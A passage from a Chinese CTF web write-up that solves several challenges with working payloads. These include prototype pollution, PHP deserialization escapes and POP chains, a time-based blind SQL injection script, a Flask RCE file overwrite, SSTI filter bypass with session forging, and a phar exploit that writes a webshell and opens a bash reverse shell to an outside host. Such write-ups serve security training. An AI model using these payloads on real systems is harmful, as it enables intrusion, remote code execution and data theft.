这行代码初始化一个minTimestamp变量。它从配置对象CONFIG中获取min_public_time属性的值，如果不存在则使用默认配置对象DEFAULT_CONFIG中的min_public_time属性的值。然后，通过new Date()构造函数将该时间转换为一个日期对象，并使用getTime()方法获取其对应的时间戳。

而当我们跟踪到config.js时发现并没有配置该属性，所以属性的值为config.default.js中的

```
module.exports = {
    app_name: "OtenkiGirl",
    default_lang: "ja",
}
1234
module.exports = {
    app_name: "OtenkiGirl",
    default_lang: "ja",
    min_public_time: "2019-07-09",
    server_port: 9960,
    webpack_dev_port: 9970
}
```

那么我们知道getInfo对timestamp进行了一次过滤，使得所返回的数据不早于配置文件config中的min_public_time，猜测flag在这个min_public_time之前

所以我们可以利用原型链污染使得该值在2019-07-09之前即可
 我们知道上传的为json格式
 ![在这里插入图片描述](assets/c77a6b3eac4640f2b3c62ff8e6c97790.png)payload

```
{  
	"contact": "test",  
	"reason": "test",  
	"__proto__": {    
		"min_public_time": "1001-01-01"  
	}
}
1234567
```

污染成功
 ![在这里插入图片描述](assets/70dad5d0f0ce495986472b63e624553d.png)再次访问，得到flag
 （如果不成功。清除下网站cookie再刷新）
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/3bbb294f7d464468914b08977f2ac774.png)

## WEEK4(php反序列化字符串逃逸(增多))

### 逃

> 考点：字符串逃逸

源码

```php
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}

class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}

unserialize(waf(serialize(new GetFlag($_GET['key']))));
```

分析一下，首先命令执行对应的参数为cmd，而实例化时可控的对象为key值，题目进行反序列化的时候我们只能通过get传参去控制key，结合waf函数可以字符替换，考虑用字符串逃逸

我们本地测试下，如果传入key值为a

```php
<?php
class GetFlag {
    public $key='a';
    public $cmd = "whoami";

}
$a=new GetFlag();
echo serialize($a);
```

那么序列化后的结果为

```php
O:7:"GetFlag":2:{s:3:"key";s:1:"a";s:3:"cmd";s:6:"whoami";}
```

由于cmd的值不可控，我们尝试把cmd的值写到key里面，也就是将字符串`";s:3:"cmd";s:9:"cat /flag";}`写进去

字符串就变成如下

```php
O:7:"GetFlag":2:{s:3:"key";s:1:"a";s:3:"cmd";s:9:"cat /flag";}";s:3:"cmd";s:6:"whoami";}
```

然后我们计算一下后面被挤掉的部分字符串`a";s:3:"cmd";s:6:"whoami";}`，长度为26，那么我们就需要26个bad被good替换的字符长度差1，再加上`whoami`变成`cat /flag`的长度差3，总共需要29个bad

所以最终构造的payload如下

```php
O:7:"GetFlag":2:{s:3:"key";s:117:""badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}";s:3:"cmd";s:6:"whoami";}

上传之后，被增多替换：就成了：
O:7:"GetFlag":2:{s:3:"key";s:117:"双引号+29个good=117个字符";s:3:"cmd";s:9:"cat /flag";}";s:3:"cmd";s:6:"whoami";}
```

也就是说上传key为

```
"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}
```

得到flag
 ![在这里插入图片描述](assets/0071c38eaffe433f9fbe9ccc7a0bdac7.png)

### More Fast(php反序列化，GC回收机制提前触发__destruct())

> 考点：GC回收机制提前触发__destruct()

源码

```php
<?php
highlight_file(__FILE__);

class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}

class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func;
    public $var;
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}

class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}

class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}

$a = @unserialize($_POST['fast']);
throw new Exception("Nope");
```

pop链

```php
Start.__destruct() --> Crypto.__toString() --> Reverse.__get() --> Pwn.__invoke() --> Web.evil() 
```

整个链子逻辑很清晰，关键考点就是开头的这一步，由于题目会抛出异常，导致__destruct()方法不能触发，所以我们要进行绕过，下面对绕过方法解释下

**GC回收机制**

> 在PHP中，使用`引用计数`和`回收周期`来自动管理内存对象的，当一个变量被设置为`NULL`，或者没有任何指针指向时，它就会被变成垃圾，被`GC`机制自动回收掉那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被`GC`机制回收，在回收的过程中，它会自动触发`_destruct`方法，而这也就是我们绕过抛出异常的关键点。

也就是在最后序列化前进行`$A=array($a,NULL);`这样的步骤
 exp如下

```php
<?php
class Start{
    public $errMsg;
}

class Pwn{
    public $obj;
}

class Reverse{
    public $func;
}

class Web{
    public $func;
    public $var;
}

class Crypto{
    public $obj;
}

class Misc{

}

$a=new Start();
$b=new Crypto();
$c=new Reverse();
$d=new Pwn();
$e=new Web();
$a->errMsg=$b;
$b->obj=$c;
$c->func=$d;
$d->obj=$e;
$e->func='system';
$e->var="cat /f*";
$A=array($a,NULL);
echo serialize($A);
```

运行结果

```php
a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:7:"cat /f*";}}}}}i:1;N;}
```

**将最后的`i:1`改为`i"0`即可，得到flag**
 ![在这里插入图片描述](assets/21976b337fc54dff939ff189f2c4ff2c.png)

### midsql(时间盲注)

> 考点：时间盲注

fuzz测试一下，发现只过滤了空格，用/**/替换
 然后测试，发现可以时间盲注

```
?id=1/**/and/**/(1,sleep(5),3)#
```

脚本如下

```python
import requests
import time

chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz,}{-'
database = ''
table = ''
column = ''
flag = ''

global DB_length
global TB_length
global CL_length

#爆数据库
for l in range(1,20):
    Url = 'http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(length(database())>{0},1,sleep(3))#'
    UrlFormat = Url.format(l)      #format（）函数使用
    start_time0 = time.time()  		#发送请求前的时间赋值
    requests.get(UrlFormat)
    if  time.time() - start_time0 > 2:	#判断正确的数据库长度
            print('database长度为：' + str(l))
            global DB_length 
            DB_length = l	#把数据库长度赋值给全局变量
            break
    else:
        pass
for i in range(1,DB_length+1):
    for char in chars:
        charAscii = ord(char) #char转换为ascii
        url = 'http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr(database(),{0},1))>{1},1,sleep(3))#'
        urlformat = url.format(i,charAscii)
        start_time = time.time()
        requests.get(urlformat)
        if  time.time() - start_time > 2:
            database+=char
            print('database第{}个字符：{}'.format(i, database))
            break
        else:
            pass
print('database： ' + database)

#爆表
for l in range(1,20):
    Url = "http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(length((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like('ctf')))>{0},1,sleep(3))#"
    UrlFormat = Url.format(l)      
    start_time0 = time.time()  		
    requests.get(UrlFormat)
    if  time.time() - start_time0 > 2:	
            print('table长度为：' + str(l))
            global TB_length 
            TB_length = l	
            break
    else:
        pass
for i in range(1,TB_length+1):
    for char in chars:
        charAscii = ord(char) #char转换为ascii
        url = "http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like('ctf')),{0},1))>{1},1,sleep(3))#"
        urlformat = url.format(i,charAscii)
        start_time = time.time()
        requests.get(urlformat)
        if  time.time() - start_time > 2:
            table+=char
            print('table第{}个字符：{}'.format(i, table))
            break
        else:
            pass
print('table： ' + table)

#爆列
for l in range(1,20):
    Url = "http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(length((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like('items')))>{0},1,sleep(3))#"
    UrlFormat = Url.format(l)      
    start_time0 = time.time()  		
    requests.get(UrlFormat)
    if  time.time() - start_time0 > 2:	
            print('column长度为：' + str(l))
            global CL_length 
            CL_length = l	
            break
    else:
        pass
for i in range(1,CL_length+1):
    for char in chars:
        charAscii = ord(char) #char转换为ascii
        url = "http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like('items')),{0},1))>{1},1,sleep(3))#"
        urlformat = url.format(i,charAscii)
        start_time = time.time()
        requests.get(urlformat)
        if  time.time() - start_time > 2:
            column+=char
            print('column第{}个字符：{}'.format(i, column))
            break
        else:
            pass
print('column： ' + column)


#爆数据
for i in range(1,80):
    for char in chars:
        charAscii = ord(char) #char转换为ascii
        url = "http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/items),{0},1))>{1},1,sleep(3))#"
        urlformat = url.format(i,charAscii)
        start_time = time.time()
        requests.get(urlformat)
        if  time.time() - start_time > 2:
            flag+=char
            print('flag第{}个字符：{}'.format(i, flag))
            break
        else:
            pass
print('flag： ' + flag)
```

### flask disk（flask debug模式，上传app.py文件覆盖原文件，RCE）

打开题目，有三个链接
 ![在这里插入图片描述](assets/df6f9bfd3f0b4b5fb66c9901a19c266e.png)分别是查看文件，上传文件，输入pin码进入`admin manage`

访问admin manage发现要输入pin码，说明flask开启了debug模式。flask开启了debug模式下，app.py源文件被修改后会立刻加载。所以只需要上传一个能rce的app.py文件把原来的覆盖，就可以了。
 (注：语法不能出错)

```python
#app.py
from flask import Flask,request
import os
app = Flask(__name__)
@app.route('/')
def index():    
    try:        
        cmd = request.args.get('cmd')        
        data = os.popen(cmd).read()        
        return data    
    except:        
        pass    
        
    return "1"#回显一个1,方便查看是否上传更新成功
if __name__=='__main__':    
    app.run(host='0.0.0.0',port=5000,debug=True)
```

上传成功后，直接在跟路由命令执行
 ![在这里插入图片描述](assets/4a5faac0717044dc80f0c75772d54081.png)

### InjectMe（复杂SSTI）

> 考点：session伪造，ssti

下载附件，发现是泄露了目录`./app`
 ![在这里插入图片描述](assets/7f357db7075a437eab320fa25d5ab0df.png)打开题目，给了download的部分源码
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/c7062a748c21439bb61807eec84e50ec.png)分析一下，`./download`路由下，接受GET参数file，如果没有则filename为空值，然后是过滤了`../`，由于这里是替换为空，可以绕过。然后拼接路径，如果存在则返回

结合Dockerfile泄露的目录，可以猜到运行文件，直接目录穿越读取源码

```
/download?file=..././..././..././app/app.py
```

源码如下

```python
import os
import re

from flask import Flask, render_template, request, abort, send_file, session, render_template_string
from config import secret_key

app = Flask(__name__)
app.secret_key = secret_key


@app.route('/')
def hello_world():  # put application's code here
    return render_template('index.html')


@app.route("/cancanneed", methods=["GET"])
def cancanneed():
    all_filename = os.listdir('./static/img/')
    filename = request.args.get('file', '')
    if filename:
        return render_template('img.html', filename=filename, all_filename=all_filename)
    else:
        return f"{str(os.listdir('./static/img/'))} <br> <a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg</a>"


@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get('file', '')
    if filename:
        filename = filename.replace('../', '')
        filename = os.path.join('static/img/', filename)
        print(filename)
        if (os.path.exists(filename)) and ("start" not in filename):
            return send_file(filename)
        else:
            abort(500)
    else:
        abort(404)


@app.route('/backdoor', methods=["GET"])
def backdoor():
    try:
        print(session.get("user"))
        if session.get("user") is None:
            session['user'] = "guest"
        name = session.get("user")
        if re.findall(
                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
                name):
            abort(500)
        else:
            return render_template_string(
                '竟然给<h1>%s</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁' % name)
    except Exception:
        abort(500)


@app.errorhandler(404)
def page_not_find(e):
    return render_template('404.html'), 404


@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html'), 500


if __name__ == '__main__':
    app.run('0.0.0.0', port=8080)
```

分析一下
 存在`./backdoor`路由，获取session中user的值，如果没有赋值为guest，有的话进行正则匹配（此处存在ssti漏洞）
 根据源码，secret_key在config.py里，我们可以访问下载得到key

获取key

```
/download?file=..././..././..././app/config.py
```

![在这里插入图片描述](assets/cfe048192e9c4087b2a3baac0c24c862.png)然后解密
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/65cd2fe4918c46819cc6ab5bfc040461.png)
 由于过滤了很多，这里用八进制编码绕过
 脚本如下

```python
import re
import requests
import subprocess
# 把这个下载了，需要使用里面的flask-session-cookie-manager3.py
# # https://github.com/noraj/flask-session-cookie-manager

def string_to_octal_ascii(s):
    octal_ascii = ""
    for char in s:
        char_code = ord(char)
        octal_ascii += "\\\\" + format(char_code, '03o')
        # octal_ascii += "\\\\" + format(char_code, 'o')    
    return octal_ascii
secret_key = "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"
# payload = "{%print(7*7)%}"
# payload = "{%print(\"\"\\\\u005f\\\\u005f\"\")%}"
# payload = "{%print(\"\"\\\\x5f\\\\x5f\"\")%}"

eval_shell = "\"\""+string_to_octal_ascii("__import__(\"os\").popen(\"cat /*\").read()")+"\"\""
print(eval_shell)
# docker部署&windows运行payload
# {{x.__init__.__globals__.__builtins__.eval('__import__("os").popen("dir").read()')}}
payload = "{{%print(xxx|attr(\"\"\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\"\")(\"\"\\\\137\\\\137\\\\142\\\\165\\\\151\\\\154\\\\164\\\\151\\\\156\\\\163\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\"\")(\"\"\\\\145\\\\166\\\\141\\\\154\"\")({0}))%}}".format(eval_shell)
print(payload)
command = "python flask_session_cookie_manager3.py encode -s \"{0}\" -t \"{{'user':'{1}'}}\"".format(secret_key,payload)
print(command)

session_data = subprocess.check_output(command, shell=True)
print(session_data)
# linux和windows换行不一样，linux是去掉最后一个，windows是最后两个。
session_data = session_data[:-2].decode('utf-8')
# session_data = session_data[:-1].decode('utf-8')
print(session_data)

url = "http://127.0.0.1:8080/backdoor"
cookies = {"session": session_data}
res = requests.get(url=url, cookies=cookies)
# print(res.text)
pattern = r'<h1>(.*)</h1>'
result_content = re.search(pattern, res.text, re.S)
# print(result_content)
if result_content:
    result = result_content.group(1)
    print(result)
else:
    print("something wrong!")
```

得到flag
 ![在这里插入图片描述](assets/c0a7b61f2cc94e99a9bc6f957c6fb1c4.png)

### PharOne(Phar反序列化、gzip压缩绕过过滤、无回显RCE)

> 考点：Phar反序列化、gzip压缩、无回显RCE

打开题目，有文件上传功能，F12有提示class.php
 访问`./class.php`，得到源码

```php
 <?php
highlight_file(__FILE__);
class Flag{
    public $cmd;
    public function __destruct()
    {
        @exec($this->cmd);
    }
}
@unlink($_POST['file']); 
```

结合文件上传，考虑phar反序列化；同时还是无回显RCE，用写入马和反弹shell都行

用普通的phar文件上传发现不行（jpg才行）
 修改然后上传发现被正则匹配
 ![在这里插入图片描述](assets/af07881b433d4a10a548767ca6b28945.png)绕过正则匹配，这里用的是gzip压缩的方法

#### 方法一 写马

exp

```php
<?php
class Flag{
    public $cmd;
}

$a=new Flag();
$a->cmd="echo \"<?=@eval(\\\$_POST['a']);\">/var/www/html/1.php";
//这里$_POST前面要三个\\\,这样才能正确解释为超级全局变量，两个的话会被当成普通变量
$phar = new Phar("hacker.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

然后gzip命令压缩
 ![在这里插入图片描述](assets/fc612d0e967742f2b66114ab24b9f38b.png)

上传成功后，访问`./class.php`
 使用phar伪协议读取上传文件

```php
file=phar://upload/9e32fd5eb93d0766e32d9e33cc3ef2d5.jpg
```

![在这里插入图片描述](assets/6bba02f9156d4c46b1b5a97fb893add8.png)执行成功后，访问写入的1.php，得到flag
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/17158a4ef0b5424eb96b00952640c6d7.png)

#### 方法二 反弹shell

exp

```php
<?php
class Flag{
    public $cmd;
}

$a=new Flag();
$a->cmd="bash -c 'bash -i >& /dev/tcp/f57819674z.imdo.co/54789 0>&1'";
$phar = new Phar("hacker.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

然后就和方法一差不多，先gzip压缩改后缀，然后phar伪协议读取
 成功反弹shell
 ![在这里插入图片描述](assets/3e8d1db636b94bb98b12297e8cf53757.png)

### OtenkiBoy（js原型链污染,过滤了`__proto__`）

> 考点：JavaSctipt 原型链污染

题目给了源码，首先是app.js

```js
const env = global.env = (process.env.NODE_ENV || "production").trim();
const isEnvDev = global.isEnvDev = env === "development";
const devOnly = (fn) => isEnvDev ? (typeof fn === "function" ? fn() : fn) : undefined
const CONFIG = require("./config"), DEFAULT_CONFIG = require("./config.default");
const PORT = CONFIG.server_port || DEFAULT_CONFIG.server_port;

const path = require("path");
const Koa = require("koa");
const bodyParser = require("koa-bodyparser");

const app = new Koa();

app.use(require('koa-static')(path.join(__dirname, './static')));
devOnly(_ => require("./webpack.proxies.dev").forEach(p => app.use(p)));
app.use(bodyParser({
    onerror: function (err, ctx) {
        // If the json is invalid, the body will be set to {}. That means, the request json would be seen as empty.
        if (err.status === 400 && err.name === 'SyntaxError' && ctx.request.type === 'application/json') {
            ctx.request.body = {}
        } else {
            throw err;
        }
    }
}));

[
    "info",
    "submit"
].forEach(p => { p = require("./routes/" + p); app.use(p.routes()).use(p.allowedMethods()) });

app.listen(PORT, () => {
    console.info(`Server is running at port ${PORT}...`);
})

module.exports = app;
```

给了两个路由，分别是`./info`和`./submit`
 追踪一下`submit.js`

```js
const Router = require("koa-router");
const router = new Router();
const SQL = require("./sql");
const sql = new SQL("wishes");
const { rndID, mergeJSON } = require("./_components/utils");

async function insert2db(data) {
    let date = String(data["date"]), place = String(data["place"]),
        contact = String(data["contact"]), reason = String(data["reason"]);
    const timestamp = Date.now();
    const wishid = rndID(24, timestamp);
    await sql.run(`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`,
        [wishid, date, place, contact, reason, timestamp]).catch(e => { throw e });
    return { wishid, date, place, contact, reason, timestamp }
}

router.post("/submit", async (ctx) => {
    if (ctx.header["content-type"] !== "application/json")
        return ctx.body = {
            status: "error",
            msg: "Content-Type must be application/json"
        }

    const jsonText = ctx.request.rawBody || "{}"
    try {
        const data = JSON.parse(jsonText);

        if (typeof data["contact"] !== "string" || typeof data["reason"] !== "string")
            return ctx.body = {
                status: "error",
                msg: "Invalid parameter"
            }
        if (data["contact"].length <= 0 || data["reason"].length <= 0)
            return ctx.body = {
                status: "error",
                msg: "Parameters contact and reason cannot be empty"
            }

        const DEFAULT = {
            date: "unknown",
            place: "unknown"
        }
        const result = await insert2db(mergeJSON(DEFAULT, data));
        ctx.body = {
            status: "success",
            data: result
        };
    } catch (e) {
        console.error(e);
        ctx.body = {
            status: "error",
            msg: "Internal Server Error"
        }
    }
})

module.exports = router;
```

大概过程就是检测content-type是否为application/json，然后就是关键语句

```
const result = await insert2db(mergeJSON(DEFAULT, data));
```

这里的data参数是可控的，继续追踪mergeJSON函数，在`\routes\_components`的utils.js里面

```js
const mergeJSON = function (target, patch, deep = false) {
    if (typeof patch !== "object") return patch;
    if (Array.isArray(patch)) return patch; // do not recurse into arrays
    if (!target) target = {}
    if (deep) { target = copyJSON(target), patch = copyJSON(patch); }
    for (let key in patch) {
        if (key === "__proto__") continue;
        if (target[key] !== patch[key])
            target[key] = mergeJSON(target[key], patch[key]);
    }
    return target;
}
```

可以发现存在原型链污染，虽然过滤了`__proto__`，但是我们可以用`constructor.prototype`去代替

接下来是寻找注入点，查看`routes/info.js`

```js
const Router = require("koa-router");
const router = new Router();
const SQL = require("./sql");
const sql = new SQL("wishes");
const { mergeJSON, createDate } = require("./_components/utils");
const CONFIG = mergeJSON(require("../config.default"), require("../config"), true);
const DEFAULT_CONFIG = require("../config.default");
const LauchTime = new Date();

async function getInfo(timestamp) {
    timestamp = typeof timestamp === "number" ? timestamp : Date.now();
    // Remove test data from before the movie was released
    let minTimestamp;
    try {
        minTimestamp = createDate(CONFIG.min_public_time).getTime();
        if (!Number.isSafeInteger(minTimestamp)) throw new Error("Invalid configuration min_public_time.");
    } catch (e) {
        console.warn(`\x1b[33m${e.message}\x1b[0m`);
        console.warn(`Try using default value ${DEFAULT_CONFIG.min_public_time}.`);
        minTimestamp = createDate(DEFAULT_CONFIG.min_public_time, { UTC: false, baseDate: LauchTime }).getTime();
    }
    timestamp = Math.max(timestamp, minTimestamp);
    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });
    return data;
}

router.post("/info/:ts?", async (ctx) => {
    if (ctx.header["content-type"] !== "application/x-www-form-urlencoded")
        return ctx.body = {
            status: "error",
            msg: "Content-Type must be application/x-www-form-urlencoded"
        }
    if (typeof ctx.params.ts === "undefined") ctx.params.ts = '0'
    const timestamp = /^[0-9]+$/.test(ctx.params.ts || "") ? Number(ctx.params.ts) : ctx.params.ts;
    if (typeof timestamp !== "number")
        return ctx.body = {
            status: "error",
            msg: "Invalid parameter ts"
        }

    try {
        const data = await getInfo(timestamp).catch(e => { throw e });
        ctx.body = {
            status: "success",
            data: data
        }
    } catch (e) {
        console.error(e);
        return ctx.body = {
            status: "error",
            msg: "Internal Server Error"
        }
    }
})

module.exports = router;
```

关键部分为getInfo函数，minTimestamp取自配置文件，在Math.max处为可控的timestamp设置下限值，我们需要将minTimestamp改小来获取更早的数据库数据。

然后追踪createDate函数，在`routes/_components/utils.js`中
 存在几个注入点

- opts 注入点

```js
const DEFAULT_CREATE_DATE_OPTIONS = {
    UTC: false,
    format: [
        "yyyy-MM-dd HH:mm:ss",
        "yyyy-MM-dd HH:mm:ss.fff",
        "yyyy-MM-dd",
        "MM/dd/yyyy",
        "MM/dd/yyyy HH:mm:ss",
        "MM/dd/yyyy HH:mm:ss.fff",
        "MM/dd/yy HH:mm:ss",
        "HH:mm:ss",
        "HH:mm:ss.fff"
    ],
    // baseDate: undefined
}

const createDate = (str, opts) => {
    const CopiedDefaultOptions = copyJSON(DEFAULT_CREATE_DATE_OPTIONS)
    if (typeof opts === "undefined") opts = CopiedDefaultOptions
    if (typeof opts !== "object") opts = { ...CopiedDefaultOptions, UTC: Boolean(opts) };
    opts.UTC = typeof opts.UTC === "undefined" ? CopiedDefaultOptions.UTC : Boolean(opts.UTC);
    opts.format = opts.format || CopiedDefaultOptions.format;
    if (!Array.isArray(opts.format)) opts.format = [opts.format]
    opts.format = opts.format.filter(f => typeof f === "string")
        .filter(f => {
            if (/yy|yyyy|MM|dd|HH|mm|ss|fff/.test(f) === false) {
                console.warn(`Invalid format "${f}".`, `At least one format specifier is required.`);
                return false;
            }
            if (`|${f}|`.replace(/yyyy/g, "yy").split(/yy|MM|dd|HH|mm|ss|fff/).includes("")) {
                console.warn(`Invalid format "${f}".`, `Delimeters are required between format specifiers.`);
                return false;
            }
            if (f.includes("yyyy") && f.replace(/yyyy/g, "").includes("yy")) {
                console.warn(`Invalid format "${f}".`, `"yyyy" and "yy" cannot be used together.`);
                return false;
            }
            return true;
        })
    opts.baseDate = new Date(opts.baseDate || Date.now());
```

当createDate的opts未指定时并不能注入，但是当opts为 JSON 对象且没有指定format属性时，下面这一行会触发原型链

```
opts.format = opts.format || CopiedDefaultOptions.format;
```

而对于baseDate，由于DEFAULT_CREATE_DATE_OPTIONS中本身不含baseDate（undefined），可直接触发该原型链

```
opts.baseDate = new Date(opts.baseDate || Date.now());
```

- 时间函数注入点

在utility functions的注释部分存在函数

```js
const getHMS = (time) => {
            let regres = /^(\d+) *\: *(\d+)( *\: *(\d+)( *\. *(\d+))?)?$/.exec(time.trim())
            if (regres === null) return {}
            let [n1, n2, n3, n4] = [regres[1], regres[2], regres[4], regres[6]].map(t => typeof t === "undefined" ? undefined : Number(t));
            if (typeof n3 === "undefined") n3 = 0; // 23:59(:59)?
            if (0 <= n1 && n1 <= 23 && 0 <= n2 && n2 <= 59 && 0 <= n3 && n3 <= 59) {
                // 23:59:59(.999)?
                let HH = pad(n1, 2), mm = pad(n2, 2), ss = pad(n3, 2),
                    fff = typeof n4 === "undefined" ? undefined : pad(n4, 3).substring(0, 3);
                const o = { HH, mm, ss }
                if (typeof fff !== "undefined") o.fff = fff;
                return o;
            } else return {}
        }
```

主要看最后几行，如果fff（即毫秒）未被定义，那么返回值中就不会带有fff属性
 调用getHMS函数的地方在createDate的末尾几行，属于createDate的 Fallback Auto Detection 部分

```js
const { HH, mm, ss, fff } = getHMS(time_str)
```

当time_str中不包含毫秒，能够触发原型链

接下来就是如何利用漏洞的问题了

```js
sortTable.forEach((f, i) => {
    if (f == "yy") {
        let year = Number(regres[i + 1])
        year = year < 100 ? (1900 + year) : year;
        return argTable["yyyy"] = year;
    }
    argTable[f] = Number(regres[i + 1])
})
```

我们发现createDate的opts的format支持yy标识符，而当年份小于100时，我们认为是20世纪的年份
 举例来说，如果format为20yy-MM-dd，在format解析字符串2023-10-01时，将解析yy为23，输出输出为1923，最终输出的年份是1923-10-01

**目标：污染format**
 前面提到，污染format的条件是opts为 JSON 对象且没有指定format属性，观察routes/info中的相应片段，我们需要触发下面的catch

```js
try {
    minTimestamp = createDate(CONFIG.min_public_time).getTime();
    if (!Number.isSafeInteger(minTimestamp)) throw new Error("Invalid configuration min_public_time.");
} catch (e) {
    console.warn(`\x1b[33m${e.message}\x1b[0m`);
    console.warn(`Try using default value ${DEFAULT_CONFIG.min_public_time}.`);
    minTimestamp = createDate(DEFAULT_CONFIG.min_public_time, { UTC: false, baseDate: LauchTime }).getTime();
}
```

触发catch的条件是前面try的createDate返回一个无效的日期，或者createDate本身被调用时法神错误，所以就要利用我们刚刚找到的两个注入点
 下面的这行代码表明了基于format的日期匹配不可能返回一个无效日期，因此返回无效日期只有 Fallback Auto Detection 能够做到

```
if (Number.isSafeInteger(d.getTime())) return d;
else continue;
12
```

从如下代码片段可知，基于format的日期匹配依赖于baseDate，format 的过程是在argTable上进行覆盖

```js
const dateObj = opts.baseDate
const _UTC = opts.UTC ? "UTC" : ""
let argTable = {
    "yyyy": dateObj[`get${_UTC}FullYear`](),
    "MM": dateObj[`get${_UTC}Month`]() + 1,
    "dd": dateObj[`get${_UTC}Date`](),
    "HH": dateObj[`get${_UTC}Hours`](),
    "mm": dateObj[`get${_UTC}Minutes`](),
    "ss": dateObj[`get${_UTC}Seconds`](),
    "fff": dateObj[`get${_UTC}Milliseconds`] ? dateObj[`get${_UTC}Milliseconds`]() : undefined // due to system architecture
}
```

因此污染baseDate为无效日期即可绕过 format 模式进入 Fallback Auto Detection
 `routes/info.js`的try中用的是config.js中的min_pulic_time，为`2019-07-09 00:00:00`，不带有毫秒，刚好能够触发fff的原型链污染，为fff指定为无效值即可

使用如下的 payload 可以触发catch

```js
{
  "contact":"1", "reason":"2",
  "constructor":{
    "prototype":{
      "baseDate":"aaa",
      "fff": "bbb"
    }
  }
}
```

